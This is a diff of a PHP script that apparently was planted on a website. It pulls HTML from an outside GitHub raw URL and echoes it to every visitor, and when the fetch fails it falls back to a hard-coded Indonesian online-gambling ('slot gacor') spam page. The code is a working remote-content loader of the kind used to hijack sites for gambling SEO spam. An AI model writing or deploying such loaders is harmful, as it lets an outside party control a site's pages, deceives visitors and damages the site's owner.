@@ -1,38 +1,22 @@
 <?php
-// URL target dari mana konten akan diambil
+
+header('Content-Type: text/html; charset=utf-8');
+
 $target_url = 'https://raw.githubusercontent.com/freyarion25/kw-lp/refs/heads/main/sh-new-lp1.txt';
 
-// Inisialisasi cURL
-$ch = curl_init();
 
-// Set opsi cURL
-curl_setopt($ch, CURLOPT_URL, $target_url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Ikuti redirect jika ada
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan verifikasi SSL (opsional, untuk development)
+$html_content = @file_get_contents($target_url);
 
-// Eksekusi dan ambil konten
-$html_content = curl_exec($ch);
-
-// Cek error
-if (curl_error($ch)) {
-    http_response_code(500);
-    echo 'Error fetching content: ' . curl_error($ch);
-    curl_close($ch);
-    exit;
-}
-
-// Ambil tipe konten dari header response
-$content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
-curl_close($ch);
-
-// Kirim header yang sesuai (biasanya text/html)
-if ($content_type) {
-    header('Content-Type: ' . $content_type);
+if ($html_content === false) {
+    echo '<!DOCTYPE html>
+    <html>
+    <head><title>Slot Online</title></head>
+    <body>
+        <h1>Slot Online – Link Bandar Slot Tergacor Malam Ini 2026</h1>
+        <p>Konten sedang dimuat. Silakan refresh halaman.</p>
+    </body>
+    </html>';
 } else {
-    header('Content-Type: text/html; charset=utf-8');
+    echo $html_content;
 }
-
-// Tampilkan konten
-echo $html_content;
 ?>
